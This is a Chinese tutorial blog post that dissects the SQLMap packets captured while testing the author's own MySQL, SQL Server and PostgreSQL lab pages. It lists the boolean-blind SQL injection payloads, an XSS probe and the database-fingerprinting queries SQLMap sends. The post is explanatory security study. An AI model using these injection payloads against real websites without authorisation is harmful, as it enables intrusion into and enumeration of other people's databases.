本文将从SQLMap的payload来剖析，SQLMap是如何判断注入点的！

我这里搭了三个环境，分别是MySQL、SQLServer、PostgreSQL数据库，注入点分别是1.php?id=1，2.php?id=1，3.php?id=1

如何判断数据库的类型
----------

首先，SQLMap是如何判断目标网站的数据库类型的呢？

如下Sqlmap通过简单发几个包就可以简单判断目标网站采用的数据库类型了。

![](https://img-blog.csdnimg.cn/20200305203647581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200305203740393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200305203831165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们加 -v3 参数看下详细的payload，并且加上 --proxy="http://127.0.0.1:8080" 参数设置代理，用burpsuite抓包。可以看到，刚开始sqlmap会发送两个数据包来探测目标网站的连通性。然后sqlmap会先送两个随机的整数payload，来判断该参数是否是动态的。确定是动态的以后，sqlmap会随机发送一些容易使目标网站报错的字符，来促使目标网站报错。

![](https://img-blog.csdnimg.cn/20200305205042539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200305205106253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200305205138217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

最后，MySQL数据库发送6个数据包。SQLServer数据库发送20个数据包，PostgreSQL数据库发送6个数据包。咦，为啥判断SQLServer数据库发了20个数据包，而判断MySQL数据库和PostgreSQL数据库才发送了6个包呢？

![](https://img-blog.csdnimg.cn/20200305205318102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果目标网站没有关闭报错提示的话，SQLmap就能从报错提示中判断出数据库类型。SQLmap通过 Sqlmap\\xml\\errors.xml 文件来正则匹配网站的报错提示，从而得知目标数据库的类型。MySQL和PostgreSQL的报错中均能知道数据库类型。而SQLServer数据库的报错不能判断是啥数据库，所以SQLMap判断SQLServer数据库的时候发送了20个数据包，后续的包是继续来探测目标数据库类型的。

![](https://img-blog.csdnimg.cn/20200305205606563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200305205819981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如下，SQLServer数据库的报错信息中不能判断目标数据库的类型，所以需要继续发探测包判断数据库类型。关于后续发的包，我们在接下来的关闭报错中解析。

![](https://img-blog.csdnimg.cn/20200305205657706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

现在我们关闭php的报错提示，再重新用sqlmap跑一次看看。如下图。最后判断MySQL数据库发了22个数据包。判断SQLServer数据库发了20个数据包，判断PostgreSQL数据库发了23个数据包。

![](https://img-blog.csdnimg.cn/20200305212056330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200305212114945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200305212133731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

现在我们来分别对MySQL的22个数据包，SQLServer的20个数据包，PostgreSQL的23个数据包做分析。

首先，这三种数据包的前12个数据包都是一样的。即如下

前2个数据包判断目标URL的连通性。第三、四个数据包判断目标 id 参数是否是动态的。第五六个数据包通过发送畸形参数，来使服务器报错，但是由于我们关闭了服务器的报错提示，所以 sqlmap 没能判断出数据库类型。所以继续发包。第7个数据包是探测目标参数是否存在XSS漏洞。第8、9、10、11、12个数据包是探测目标参数是否存在布尔类型盲注。

```
/1.php?id=1      
/1.php?id=1      
/1.php?id=4318      
/1.php?id=5111      
/1.php?id=1,.,"),'()(      
/1.php?id=4958-4957      
/1.php?id=1'eHvJgr<'">pGTQPK      
/1.php?id=1) AND 3885=6801 AND (2452=2452      
/1.php?id=1) AND 6545=6545 AND (9487=9487      1
/1.php?id=1 AND 5954=9929      1
/1.php?id=1 AND 6545=6545      1
/1.php?id=1 AND 2829=7659
```


确定目标网站存在布尔类型盲注后，继续发包探测目标数据库的类型。探测MySQL数据库发了10个数据包，SQLServer是8个，PostgreSQL是11个。其实后续这些数据包，每个包都是用来探测是否是一种数据库。

**MySQL的数据包**

```
1 AND (SELECT CHR(80)&CHR(112)&CHR(71)&CHR(119) FROM MSysAccessObjects)=CHR(80)&CHR(112)&CHR(71)&CHR(119)     #判断是否是Access数据库      
1 AND (SELECT CHR(106)||CHR(119)||CHR(85)||CHR(80) FROM SYSIBM.SYSDUMMY1)=CHR(106)||CHR(119)||CHR(85)||CHR(80)   #判断是否是DB2数据库      
1 AND (SELECT 'XQAF' FROM RDB$DATABASE)='XQAF'           #判断是否是FireBird数据库      
1 AND (SELECT CHAR(67)||CHAR(74)||CHAR(78)||CHAR(82) FROM INFORMATION_SCHEMA.SYSTEM_USERS)=CHAR(67)||CHAR(74)||CHAR(78)||CHAR(82)      
1 AND (SELECT CHR(113)||CHR(84)||CHR(116)||CHR(87) FROM SYSMASTER:SYSDUAL)=CHR(113)||CHR(84)||CHR(116)||CHR(87)      
1 AND (SELECT 'jImR' FROM VERSIONS)='jImR'      
1 AND (SELECT CHAR(121)+CHAR(77)+CHAR(122)+CHAR(120))=CHAR(121)+CHAR(77)+CHAR(122)+CHAR(120)      
1 AND (SELECT CHAR(121)+CHAR(77)+CHAR(122)+CHAR(120))=CHAR(79)+CHAR(65)+CHAR(72)+CHAR(99)      
1 AND (SELECT 0x636e5152)=0x636e5152      1
1 AND (SELECT 0x636e5152)=0x6149544e
```


**SQLServer的数据包**

```
1 AND (SELECT CHR(109)&CHR(106)&CHR(109)&CHR(89) FROM MSysAccessObjects)=CHR(109)&CHR(106)&CHR(109)&CHR(89)   #判断是否是Access数据库      
1 AND (SELECT CHR(105)||CHR(107)||CHR(119)||CHR(100) FROM SYSIBM.SYSDUMMY1)=CHR(105)||CHR(107)||CHR(119)||CHR(100)    #判断是否是DB2数据库      
1 AND (SELECT 'bEhq' FROM RDB$DATABASE)='bEhq'   #判断是否是FireBird数据库      
1 AND (SELECT CHAR(120)||CHAR(66)||CHAR(102)||CHAR(111) FROM INFORMATION_SCHEMA.SYSTEM_USERS)=CHAR(120)||CHAR(66)||CHAR(102)||CHAR(111)      
1 AND (SELECT CHR(121)||CHR(112)||CHR(102)||CHR(100) FROM SYSMASTER:SYSDUAL)=CHR(121)||CHR(112)||CHR(102)||CHR(100)      
1 AND (SELECT 'vuKE' FROM VERSIONS)='vuKE'      
1 AND (SELECT CHAR(80)+CHAR(85)+CHAR(82)+CHAR(69))=CHAR(80)+CHAR(85)+CHAR(82)+CHAR(69)      
1 AND (SELECT CHAR(80)+CHAR(85)+CHAR(82)+CHAR(69))=CHAR(122)+CHAR(111)+CHAR(82)+CHAR(121)
```


**PostgreSQL的数据包**

```
1 AND (SELECT CHR(122)&CHR(65)&CHR(115)&CHR(68) FROM MSysAccessObjects)=CHR(122)&CHR(65)&CHR(115)&CHR(68)    #判断是否是Access数据库      
1 AND (SELECT CHR(119)||CHR(107)||CHR(68)||CHR(78) FROM SYSIBM.SYSDUMMY1)=CHR(119)||CHR(107)||CHR(68)||CHR(78)   #判断是否是DB2数据库      
1 AND (SELECT 'gOyp' FROM RDB$DATABASE)='gOyp'   #判断是否是FireBird数据库      
1 AND (SELECT CHAR(84)||CHAR(97)||CHAR(72)||CHAR(121) FROM INFORMATION_SCHEMA.SYSTEM_USERS)=CHAR(84)||CHAR(97)||CHAR(72)||CHAR(121)      
1 AND (SELECT CHR(118)||CHR(110)||CHR(68)||CHR(81) FROM SYSMASTER:SYSDUAL)=CHR(118)||CHR(110)||CHR(68)||CHR(81)      
1 AND (SELECT 'RBRO' FROM VERSIONS)='RBRO'      
1 AND (SELECT CHAR(118)+CHAR(117)+CHAR(113)+CHAR(74))=CHAR(118)+CHAR(117)+CHAR(113)+CHAR(74)      
1 AND (SELECT 0x58717773)=0x58717773      
1 AND (SELECT CHR(73)||CHR(97)||CHR(113)||CHR(106) FROM DUAL)=CHR(73)||CHR(97)||CHR(113)||CHR(106)      1
1 AND (SELECT (CHR(65)||CHR(105)||CHR(113)||CHR(97)))=(CHR(65)||CHR(105)||CHR(113)||CHR(97))      1
1 AND (SELECT (CHR(65)||CHR(105)||CHR(113)||CHR(97)))=(CHR(104)||CHR(122)||CHR(100)||CHR(102))
```


以上是通过布尔盲注来判断目标数据库是啥类型，下面来看看时间盲注的payload

![](https://img-blog.csdnimg.cn/20200307195952324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200307200955304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200307200907814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

文章知识点与官方知识档案匹配，可进一步学习相关知识

[PostgreSQL技能树](https://edu.csdn.net/skill/pg/pg-2e691ed3a847424eb887b40aca750c4e)[SQL高级技巧](https://edu.csdn.net/skill/pg/pg-2e691ed3a847424eb887b40aca750c4e)[递归查询](https://edu.csdn.net/skill/pg/pg-2e691ed3a847424eb887b40aca750c4e)2336 人正在系统学习中